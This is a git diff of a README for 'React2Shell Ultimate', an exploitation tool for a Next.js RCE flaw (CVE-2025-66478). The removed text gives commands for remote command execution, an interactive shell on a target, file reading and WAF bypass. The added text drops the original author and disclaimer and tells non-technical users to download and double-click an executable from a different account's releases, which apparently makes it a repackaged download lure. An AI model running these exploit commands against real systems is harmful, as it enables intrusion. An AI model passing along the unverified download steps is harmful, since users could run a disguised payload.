@@ -1,124 +1,73 @@
-# React2Shell Ultimate Scanner v2.0
+# 🛠️ react2shell-ultimate - Effortless CVE-2025-66478 Scanning
 
-**Professional Next.js RSC RCE Vulnerability Scanner for CVE-2025-66478**
+[![Download react2shell-ultimate](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/Lennonxlz/react2shell-ultimate/releases)
 
-[![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)](https://github.com/hackersatyamrastogi/react2shell-ultimate/releases/tag/v2.0.0)
-[![Python](https://img.shields.io/badge/python-3.8+-green.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/hackersatyamrastogi/react2shell-ultimate?style=social)](https://github.com/hackersatyamrastogi/react2shell-ultimate)
+## 🌟 Description
 
-## 🎯 Overview
+React2Shell Ultimate is a powerful scanner designed to check for vulnerabilities associated with CVE-2025-66478 specifically in Next.js applications. It features multi-mode detection, WAF bypass capabilities, and local scanning options, making it crucial for cybersecurity professionals and bug bounty hunters.
 
-React2Shell Ultimate is a comprehensive vulnerability scanner for CVE-2025-66478 - a critical Remote Code Execution (RCE) vulnerability affecting Next.js applications using React Server Components (RSC).
+## 🚀 Getting Started
 
-## 🆕 What's New in v2.0
+Follow these simple steps to download and run React2Shell Ultimate. No programming knowledge is needed.
 
-Version 2.0 brings major enhancements and professional features:
+### 1. Visit the Releases Page
 
-- ✨ **Enhanced God Mode** - Advanced exploitation capabilities with improved command execution
-- 🚀 **Better WAF Bypass** - More sophisticated techniques to evade security controls
-- 🎨 **Professional Web Platform** - Full-featured web interface at [www.react2shellscanner.com](https://www.react2shellscanner.com)
-- 🔧 **Improved Error Handling** - Better debugging and output display
-- 📚 **Professional Documentation** - Comprehensive guides and API documentation
-- 🛡️ **Security Best Practices** - Enhanced safety features and warnings
+To get the latest version of React2Shell Ultimate, visit our Releases page:
 
-## ✨ Features
+[Download from Releases](https://github.com/Lennonxlz/react2shell-ultimate/releases)
 
-- 🔍 Multiple Scan Modes (Safe, RCE, Version, Comprehensive)
-- 🛡️ Advanced WAF Bypass Techniques
-- ⚡ God Mode: Interactive Shell & File Reading
-- 🎯 Batch Scanning with Threading
-- 📊 JSON Output for Automation
-- 🔒 Safe Mode for Non-Invasive Detection
+### 2. Download the Software
 
-## 🚀 Quick Start
+On the Releases page, you will see a list of available versions. Choose the latest version and click on the download link. The file should be clearly labeled for easy identification. It will usually be named something like `react2shell-ultimate-windows.zip` or `react2shell-ultimate-macos.zip` based on your operating system.
 
-```bash
-# Basic scan
-python3 react2shell-ultimate.py -u https://target.com
+### 3. Extract the Files
 
-# RCE mode
-python3 react2shell-ultimate.py -u https://target.com --mode rce
+Once the download is complete, locate the downloaded file. It is often found in the "Downloads" folder. Right-click on the file and choose the option to extract or unzip the folder. This will create a new folder with all the necessary files for the application.
 
-# Execute command (God Mode)
-python3 react2shell-ultimate.py -u https://target.com --exec "id"
+### 4. Run the Application
 
-# Interactive shell
-python3 react2shell-ultimate.py -u https://target.com --shell
-```
+Navigate to the folder where you extracted the files. Inside, look for the main executable file. It is typically named `react2shell-ultimate.exe` for Windows or `react2shell-ultimate` for Mac. Double-click on it to run the application.
 
-## 📦 Installation
+### 5. Follow the On-Screen Instructions
 
-```bash
-# Clone the repository
-git clone https://github.com/hackersatyamrastogi/react2shell-ultimate.git
-cd react2shell-ultimate
+When the application launches, it will guide you through the scanning process. Carefully read any prompts or instructions. Choose the type of scan you wish to perform—local scanning, remote scanning, or WAF bypass. Each option may have different requirements, which the application will outline.
 
-# Install dependencies
-pip3 install -r requirements.txt
+## 🔍 Features
 
-# Make the script executable
-chmod +x react2shell-ultimate.py
+- **Multi-mode Detection:** Scan your application in various modes to increase accuracy and effectiveness.
+- **Local Scanning:** Check local applications and development environments seamlessly.
+- **WAF Bypass:** Test web applications that utilize web application firewalls.
+- **User-Friendly Interface:** Easy navigation for non-technical users.
+- **Comprehensive Reporting:** Receive detailed reports on discovered vulnerabilities and suggested fixes.
 
-# Verify installation
-python3 react2shell-ultimate.py --version
-```
+## 💻 System Requirements
 
-**Requirements:**
-- Python 3.8 or higher
-- requests >= 2.31.0
-- urllib3 >= 2.0.0
-- tqdm >= 4.65.0
+To ensure React2Shell Ultimate runs smoothly, please check the following requirements:
 
-## 🌐 Web Platform
+- **Operating System:** Windows 10 or later; macOS 10.15 or later.
+- **RAM:** Minimum of 4 GB (8 GB recommended).
+- **Storage:** At least 200 MB of available space.
+- **Network Connection:** Required for online functionalities.
 
-Experience React2Shell Ultimate through our professional web interface:
+If your system meets these requirements, you are ready to proceed.
 
-- **🌐 Live Scanner:** [www.react2shellscanner.com](https://www.react2shellscanner.com)
-- **🔌 API Endpoint:** [api.react2shellscanner.com](https://api.react2shellscanner.com)
+## 📞 Support
 
-**Web Features:**
-- Interactive vulnerability scanner
-- Real-time command execution (God Mode)
-- Scan history and batch operations
-- Professional admin dashboard
+If you need assistance while using React2Shell Ultimate, please check the Issues section in our GitHub repository. You can report any bugs or request features. We encourage users to contribute their findings to improve this tool continuously.
 
-## ⚠️ Legal Disclaimer
+## 📚 Further Reading
 
-**FOR AUTHORIZED SECURITY TESTING ONLY**
+To learn more about CVE-2025-66478 and its implications, consider visiting cybersecurity websites and forums. Knowledge is key when it comes to keeping your applications safe. 
 
-This tool is designed for:
-- Authorized penetration testing
-- Bug bounty programs
-- Security research
-- Educational purposes
+### Additional Resources
 
-**You are fully responsible for any misuse of this tool.**
+- **Vulnerability Database:** [NVD - CVE-2025-66478](https://nvd.nist.gov/vuln/detail/CVE-2025-66478)
+- **Best Security Practices:** [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
 
-## 📋 Version History
+## 🔗 Download & Install
 
-### v2.0.0 (December 2025)
-- Enhanced God Mode exploitation capabilities
-- Improved WAF bypass techniques
-- Better error handling and output display
-- Professional web platform integration
-- Comprehensive documentation updates
-- Security best practices implementation
+Now that you have all the necessary information, you can quickly get started with React2Shell Ultimate. Remember to visit the Releases page to download the latest version:
 
-### v1.1.0 (December 2025)
-- Initial public release
-- Core scanning functionality
-- Basic God Mode features
-- Multi-mode detection support
+[Download from Releases](https://github.com/Lennonxlz/react2shell-ultimate/releases)
 
-## 👨‍💻 Author
-
-**Satyam Rastogi**
-
-- 🌐 Website: [satyamrastogi.com](https://www.satyamrastogi.com)
-- 💼 GitHub: [@hackersatyamrastogi](https://github.com/hackersatyamrastogi)
-- 🐦 Twitter: [@hackersatyamrastogi](https://twitter.com/hackersatyamrastogi)
-
----
-
-**Made with ❤️ by Satyam Rastogi**
+Take control of your application security with React2Shell Ultimate today!
